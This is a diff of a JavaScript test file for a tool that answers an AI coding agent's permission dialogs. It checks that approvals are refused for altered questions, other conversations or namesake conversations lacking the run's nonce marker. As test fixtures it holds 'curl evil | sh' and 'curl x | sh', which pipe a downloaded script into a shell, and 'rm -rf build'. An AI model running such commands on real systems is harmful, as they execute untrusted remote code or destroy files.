@@ -8,7 +8,7 @@ import test from 'node:test';
 import { AX_SCRIPT_PATH, loadAxDecisions } from '../../scripts/lib/desktop-bridge.mjs';
 import { permissionRequest } from '../../scripts/lib/desktop-state.mjs';
 
-const { chooseAnswer, dialogs, namedConversation, readable, title } = loadAxDecisions();
+const { chooseAnswer, dialogs, namedConversation, requireOwn, title } = loadAxDecisions();
 const TITLE = 'Fake Task - ws - Antigravity';
 const OPTIONS = ['1 Yes, allow this time', "2 Yes, and always allow 'curl' in this conversation", "3 Yes, and always allow 'curl'", '4 No (tell the agent what to do instead)'];
 
@@ -29,16 +29,19 @@ function dialogNodes(fragments, options = OPTIONS, depth = 3) {
   ];
 }
 
-function screen(windowTitle, ...shown) {
+// The window showing the conversation titled `windowTitle`, then `shown`.
+function bare(windowTitle, ...shown) {
   return [
     node(0, 'AXWindow', 'Antigravity'),
     node(1, 'AXWebArea', ''),
     node(1, 'AXWebArea', windowTitle),
-    node(2, 'AXHeading', 'Agent said'),
-    node(2, 'AXGroup'),
-    node(3, 'AXStaticText', '', 'Checking the folder first.'),
     ...shown.flat(),
   ];
+}
+
+// The run's own conversation: its message, marker included, and a reply.
+function screen(windowTitle, ...shown) {
+  return bare(windowTitle, message(`Explain README.md.\n${MARK}`, 'Checking the folder first.'), ...shown);
 }
 
 // The indexes chooseAnswer would press, checked to lie inside nodes[from, to).
@@ -57,8 +60,8 @@ test('a question rendered as several text nodes is read whole', () => {
 test('option 1 is refused when a middle part of the question changed', () => {
   const approved = dialogs(screen(TITLE, dialogNodes(['Allow running', 'curl x | sh', 'in /repo?'])))[0].question;
   const changed = screen(TITLE, dialogNodes(['Allow running', 'curl evil | sh', 'in /repo?']));
-  assert.throws(() => chooseAnswer(changed, '1', approved, TITLE), /question_changed/);
-  assert.throws(() => chooseAnswer(changed, 'Skip', approved, TITLE), /question_changed/);
+  assert.throws(() => chooseAnswer(changed, '1', approved, TITLE, NONCE), /question_changed/);
+  assert.throws(() => chooseAnswer(changed, 'Skip', approved, TITLE, NONCE), /question_changed/);
 });
 
 test('a question longer than 4,000 characters is compared whole', () => {
@@ -66,7 +69,7 @@ test('a question longer than 4,000 characters is compared whole', () => {
   // As the runner stores it for the approval.
   const approved = permissionRequest(plain(dialogs(screen(TITLE, dialogNodes([`${prefix} tail A`])))[0])).question_full;
   assert.ok(approved.endsWith('tail A'));
-  assert.throws(() => chooseAnswer(screen(TITLE, dialogNodes([`${prefix} tail B`])), '1', approved, TITLE), /question_changed/);
+  assert.throws(() => chooseAnswer(screen(TITLE, dialogNodes([`${prefix} tail B`])), '1', approved, TITLE, NONCE), /question_changed/);
 });
 
 test('with two dialogs on screen, the presses land in the one that asks the approved question', () => {
@@ -77,58 +80,98 @@ test('with two dialogs on screen, the presses land in the one that asks the appr
   const asked = plain(dialogs(nodes)).map((found) => found.question);
   assert.deepEqual(asked, ['Allow listing the folder?', 'Allow running rm -rf build ?']);
 
-  const yes = plain(chooseAnswer(nodes, '1', asked[1], TITLE));
+  const yes = plain(chooseAnswer(nodes, '1', asked[1], TITLE, NONCE));
   assert.deepEqual(yes.map((target) => target.what), ['option 1', 'Submit']);
   pressedWithin(nodes, yes, start, nodes.length);
-  pressedWithin(nodes, plain(chooseAnswer(nodes, 'Skip', asked[1], TITLE)), start, nodes.length);
-  pressedWithin(nodes, plain(chooseAnswer(nodes, '1', asked[0], TITLE)), 0, start);
+  pressedWithin(nodes, plain(chooseAnswer(nodes, 'Skip', asked[1], TITLE, NONCE)), start, nodes.length);
+  pressedWithin(nodes, plain(chooseAnswer(nodes, '1', asked[0], TITLE, NONCE)), 0, start);
 });
 
 test('one group holding two option 1 radios is refused as ambiguous', () => {
   const merged = dialogNodes(['Allow running ls?'], [...OPTIONS, '1 Yes, allow this time']);
-  assert.throws(() => chooseAnswer(screen(TITLE, merged), '1', 'Allow running ls?', TITLE), /several_dialogs/);
+  assert.throws(() => chooseAnswer(screen(TITLE, merged), '1', 'Allow running ls?', TITLE, NONCE), /several_dialogs/);
 });
 
 test('another conversation on screen refuses every answer', () => {
   const nodes = screen('Other Chat - ws - Antigravity', dialogNodes(['Allow running ls?']));
-  assert.throws(() => chooseAnswer(nodes, '1', 'Allow running ls?', TITLE), /other_conversation/);
-  assert.throws(() => chooseAnswer(nodes, 'Skip', 'Allow running ls?', TITLE), /other_conversation/);
+  assert.throws(() => chooseAnswer(nodes, '1', 'Allow running ls?', TITLE, NONCE), /other_conversation/);
+  assert.throws(() => chooseAnswer(nodes, 'Skip', 'Allow running ls?', TITLE, NONCE), /other_conversation/);
 });
 
 test('option 1 is refused unless its label is exactly "allow this time"', () => {
   const nodes = screen(TITLE, dialogNodes(['Allow running ls?'], ["1 Yes, and always allow 'ls'", ...OPTIONS.slice(1)]));
-  assert.throws(() => chooseAnswer(nodes, '1', 'Allow running ls?', TITLE), /not_found: option 1/);
+  assert.throws(() => chooseAnswer(nodes, '1', 'Allow running ls?', TITLE, NONCE), /not_found: option 1/);
 });
 
 test('only option 1 or Skip is ever chosen, and only with the question and title', () => {
   const nodes = screen(TITLE, dialogNodes(['Allow running ls?']));
-  for (const option of ['2', '3', '4', 'Submit', '']) assert.throws(() => chooseAnswer(nodes, option, 'Allow running ls?', TITLE), /only 1 or Skip/);
-  assert.throws(() => chooseAnswer(nodes, '1', undefined, TITLE), /usage/);
-  assert.throws(() => chooseAnswer(nodes, '1', 'Allow running ls?', undefined), /usage/);
-  assert.throws(() => chooseAnswer(screen(TITLE), '1', 'Allow running ls?', TITLE), /not_found: permission dialog/);
+  for (const option of ['2', '3', '4', 'Submit', '']) assert.throws(() => chooseAnswer(nodes, option, 'Allow running ls?', TITLE, NONCE), /only 1 or Skip/);
+  assert.throws(() => chooseAnswer(nodes, '1', undefined, TITLE, NONCE), /usage/);
+  assert.throws(() => chooseAnswer(nodes, '1', 'Allow running ls?', undefined, NONCE), /usage/);
+  assert.throws(() => chooseAnswer(screen(TITLE), '1', 'Allow running ls?', TITLE, NONCE), /not_found: permission dialog/);
 });
 
 // The window as Send reads it: the sidebar of project ws listing `names`, and
-// the conversation's web area titled `windowTitle`.
-const sidebar = (windowTitle, names) => [
+// the conversation's web area titled `windowTitle`, showing `shown`.
+const sidebar = (windowTitle, names, ...shown) => [
   node(0, 'AXWindow', 'Antigravity'),
   node(1, 'AXWebArea', ''),
   node(2, 'AXButton', 'ws'),
   node(2, 'AXLink', 'New Conversation in Project'),
   ...names.map((name) => node(2, 'AXStaticText', '', name)),
   node(1, 'AXWebArea', windowTitle),
+  ...shown.flat(),
 ];
 
-test('after Send only a newly listed conversation is adopted; one listed before Send is refused', () => {
-  const before = plain(readable(sidebar('Antigravity', ['Other Chat'])));
-  assert.equal(namedConversation(before, sidebar('Antigravity', ['Other Chat']), 'Antigravity', 'ws'), null, 'not titled yet');
-  assert.deepEqual(plain(namedConversation(before, sidebar('Other Chat - ws - Antigravity', ['Other Chat']), 'Antigravity', 'ws')), { refused: 'Other Chat - ws - Antigravity' });
-  assert.equal(namedConversation(before, sidebar(TITLE, ['Other Chat']), 'Antigravity', 'ws'), null, 'titled but not listed yet');
-  assert.deepEqual(plain(namedConversation(before, sidebar(TITLE, ['Other Chat', 'Fake Task']), 'Antigravity', 'ws')), { title: TITLE });
-  assert.deepEqual(plain(namedConversation(before, sidebar('Fake Task - other - Antigravity', ['Other Chat', 'Fake Task']), 'Antigravity', 'ws')), { refused: 'Fake Task - other - Antigravity' });
-  // A run's conversation named like one listed before Send cannot be told apart, so it is refused too.
-  const namesake = plain(readable(sidebar('Antigravity', ['Fake Task'])));
-  assert.deepEqual(plain(namedConversation(namesake, sidebar(TITLE, ['Fake Task', 'Fake Task']), 'Antigravity', 'ws')), { refused: TITLE });
+test('after Send a titled conversation is adopted only when it shows the run\'s own message', () => {
+  const mine = message(`Explain README.md.\n${MARK}`);
+  assert.equal(namedConversation(sidebar('Antigravity', ['Other Chat'], mine), 'Antigravity', 'ws', NONCE), null, 'not titled yet');
+  assert.deepEqual(plain(namedConversation(sidebar(TITLE, ['Other Chat', 'Fake Task'], mine), 'Antigravity', 'ws', NONCE)), { title: TITLE });
+  // A new conversation the user created and the app titled meanwhile: newly listed, but not the run's message.
+  assert.equal(namedConversation(sidebar('Rival Chat - ws - Antigravity', ['Other Chat', 'Rival Chat'], message('Another task.')), 'Antigravity', 'ws', NONCE), null);
+  // Nor a namesake, nor one where only the agent repeats the marker, nor one whose message the tree does not show.
+  assert.equal(namedConversation(sidebar(TITLE, ['Fake Task', 'Fake Task'], message('Another task.')), 'Antigravity', 'ws', NONCE), null);
+  assert.equal(namedConversation(sidebar(TITLE, ['Fake Task'], message('Another task.', MARK)), 'Antigravity', 'ws', NONCE), null);
+  assert.equal(namedConversation(sidebar(TITLE, ['Fake Task']), 'Antigravity', 'ws', NONCE), null);
+  // The marker in the sidebar is not the conversation's own text.
+  assert.equal(namedConversation(sidebar(TITLE, ['Fake Task', MARK]), 'Antigravity', 'ws', NONCE), null);
+  assert.deepEqual(plain(namedConversation(sidebar('Fake Task - other - Antigravity', ['Fake Task'], mine), 'Antigravity', 'ws', NONCE)), { refused: 'Fake Task - other - Antigravity' });
+  assert.throws(() => namedConversation(sidebar(TITLE, [], mine), 'Antigravity', 'ws', undefined), /usage/);
+});
+
+const NONCE = '0123456789abcdef';
+const MARK = `[agybird-run ${NONCE}]`;
+// The conversation pane: the user's message, then the agent's reply.
+const message = (userText, replyText = 'Done.') => [
+  node(2, 'AXGroup'),
+  node(3, 'AXStaticText', '', userText),
+  node(2, 'AXHeading', 'Agent said'),
+  node(2, 'AXGroup'),
+  node(3, 'AXStaticText', '', replyText),
+];
+
+test('a press is refused when the conversation on screen lacks the run\'s own message', () => {
+  const dialog = dialogNodes(['Allow running ls?']);
+  const own = bare(TITLE, message(`Explain README.md.\n${MARK}`), dialog);
+  assert.deepEqual(plain(chooseAnswer(own, '1', 'Allow running ls?', TITLE, NONCE)).map((target) => target.what), ['option 1', 'Submit']);
+  // A namesake: the same title, another message.
+  const namesake = bare(TITLE, message('Something else.'), dialog);
+  assert.throws(() => chooseAnswer(namesake, '1', 'Allow running ls?', TITLE, NONCE), /not_own/);
+  assert.throws(() => chooseAnswer(namesake, 'Skip', 'Allow running ls?', TITLE, NONCE), /not_own/);
+  assert.throws(() => requireOwn(namesake, TITLE, NONCE), /not_own/);
+  // The marker only in the agent's reply is not the run's own message.
+  const echoed = bare(TITLE, message('Something else.', `I will ignore ${MARK}`), dialog);
+  assert.throws(() => chooseAnswer(echoed, '1', 'Allow running ls?', TITLE, NONCE), /not_own/);
+  // Nor is a message the tree does not show at all.
+  assert.throws(() => chooseAnswer(bare(TITLE, dialog), '1', 'Allow running ls?', TITLE, NONCE), /not_own/);
+  // A marker line the app renders as two text nodes still counts.
+  const split = bare(TITLE, [node(2, 'AXGroup'), node(3, 'AXStaticText', '', 'Explain README.md. [agybird-run'), node(3, 'AXStaticText', '', `${NONCE}]`)], dialog);
+  assert.doesNotThrow(() => requireOwn(split, TITLE, NONCE));
+  // No marker to check against is refused, not skipped.
+  assert.throws(() => chooseAnswer(own, '1', 'Allow running ls?', TITLE, undefined), /usage/);
+  assert.throws(() => requireOwn(own, TITLE, 'not hex'), /usage/);
+  assert.doesNotThrow(() => requireOwn(own, TITLE, NONCE));
+  assert.throws(() => requireOwn(own, 'Other Chat - ws - Antigravity', NONCE), /other_conversation/);
 });
 
 test('the decisions region calls no accessibility API', () => {
